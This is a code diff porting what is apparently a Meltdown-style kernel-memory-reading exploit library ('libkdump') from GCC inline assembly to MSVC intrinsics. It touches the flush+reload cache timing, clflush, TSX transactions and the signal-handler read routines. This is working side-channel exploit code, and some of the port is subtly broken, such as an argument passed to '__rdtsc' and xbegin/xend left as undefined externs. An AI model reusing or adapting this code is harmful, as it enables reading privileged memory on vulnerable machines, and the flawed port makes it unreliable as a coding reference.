@@ -1,15 +1,16 @@
 #include "libkdump.h"
-#include <cpuid.h>
+//#include <cpuid.h>
 #include <errno.h>
 #include <fcntl.h>
 #include <memory.h>
 #include <pthread.h>
-#include <sched.h>
+//#include <sched.h>
 #include <setjmp.h>
 #include <signal.h>
 #include <stdarg.h>
 #include <stdlib.h>
-#include <unistd.h>
+//#include <unistd.h>
+#include <intrin.h>
 
 libkdump_config_t libkdump_auto_config = {0};
 
@@ -108,27 +109,30 @@ static void debug(d_sym_t symbol, const char *fmt, ...) {
 
 // ---------------------------------------------------------------------------
 static inline uint64_t rdtsc() {
-  uint64_t a = 0, d = 0;
-  asm volatile("mfence");
-#if defined(USE_RDTSCP) && defined(__x86_64__)
-  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
-#elif defined(__x86_64__)
-  asm volatile("rdtsc" : "=a"(a), "=d"(d));
-#endif
-  a = (d << 32) | a;
-  asm volatile("mfence");
+  uint64_t a = 0;//, d = 0;
+  unsigned int aux;
+  _mm_mfence();
+  #if defined(USE_RDTSCP) && defined(__x86_64__)
+      //asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
+       a = __rdtsc(&aux);
+  #elif defined(__x86_64__)
+      //asm volatile("rdtsc" : "=a"(a), "=d"(d));
+        a = __rdtsc();
+  #endif
+  //a = (d << 32) | a;
+   _mm_mfence();
   return a;
 }
 
 // #if defined(__x86_64__)
 // ---------------------------------------------------------------------------
-static inline void maccess(void *p) {
-  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
+static __forceinline void maccess(void* p) {
+    volatile unsigned char val = *(volatile unsigned char*)p;
+    (void)val;
 }
 
-// ---------------------------------------------------------------------------
-static void flush(void *p) {
-  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
+static __forceinline void flush(void* p) {
+    _mm_clflush(p);
 }
 // #else
 // // ---------------------------------------------------------------------------
@@ -143,7 +147,7 @@ static void flush(void *p) {
 // #endif
 
 // ---------------------------------------------------------------------------
-static int __attribute__((always_inline)) flush_reload(void *ptr) { //checks if ptr is in cache
+__forceinline static int flush_reload(void *ptr) { //checks if ptr is in cache
   uint64_t start = 0, end = 0;
 
   start = rdtsc();
@@ -161,7 +165,7 @@ static int __attribute__((always_inline)) flush_reload(void *ptr) { //checks if 
 // ---------------------------------------------------------------------------
 static void *nopthread(void *dummy) {
   while (1) {
-    asm volatile("nop");
+      __nop();
   }
 }
 
@@ -181,18 +185,20 @@ static void *yieldthread(void *dummy) {
 
 #ifndef NO_TSX
 // ---------------------------------------------------------------------------
-static __attribute__((always_inline)) inline unsigned int xbegin(void) { //starts tsx
-  unsigned status;
-  //asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
-  asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
-  return status;
-}
+//static __attribute__((always_inline)) inline unsigned int xbegin(void) { //starts tsx
+//  unsigned status;
+//  //asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
+//  asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
+//  return status;
+//}
+extern unsigned int xbegin(void);
 
 // ---------------------------------------------------------------------------
-static __attribute__((always_inline)) inline void xend(void) { //ends tsx
-  //asm volatile("xend" ::: "memory"); 
-  asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory"); // 
-}
+//static __attribute__((always_inline)) inline void xend(void) { //ends tsx
+//  //asm volatile("xend" ::: "memory"); 
+//  asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory"); // 
+//}
+extern void xend(void);
 #endif
 
 // ---------------------------------------------------------------------------
@@ -303,7 +309,8 @@ static int check_config() {
 }
 
 // ---------------------------------------------------------------------------
-static void unblock_signal(int signum __attribute__((__unused__))) {
+//static void unblock_signal(int signum __attribute__((__unused__))) {
+static void unblock_signal(int signum) {
   sigset_t sigs;
   sigemptyset(&sigs);
   sigaddset(&sigs, signum);
@@ -425,7 +432,7 @@ size_t libkdump_phys_to_virt(size_t addr) {
 void libkdump_enable_debug(int enable) { dbg = enable; }
 
 // ---------------------------------------------------------------------------
-static int __attribute__((always_inline)) read_value() {
+__forceinline static int read_value() {
   int i, hit = 0;
   for (i = 0; i < 256; i++) {
     if (flush_reload(mem + i * 4096)) {
@@ -437,7 +444,9 @@ static int __attribute__((always_inline)) read_value() {
 }
 
 // ---------------------------------------------------------------------------
-int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() { //read with tsx
+#pragma optimize("s", on)
+//int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() {
+__declspec(noinline) int libkdump_read_tsx() { //read with tsx
 #ifndef NO_TSX
   size_t retries = config.retries + 1;
   uint64_t start = 0, end = 0;
@@ -463,7 +472,9 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() { //read with
 }
 
 // ---------------------------------------------------------------------------
-int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
+//int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
+
+__declspec(noinline) int libkdump_read_signal_handler() {
   size_t retries = config.retries + 1;
   uint64_t start = 0, end = 0;
 
@@ -485,9 +496,12 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
   }
   return 0;
 }
+#pragma optimize("s", off)
 
 // ---------------------------------------------------------------------------
-int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) { //8 bits of data from addr
+//int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) { //8 bits of data from addr
+#pragma optimize("", off)
+int libkdump_read(size_t addr) { //8 bits of data from addr
   phys = addr;
 
   char res_stat[256];
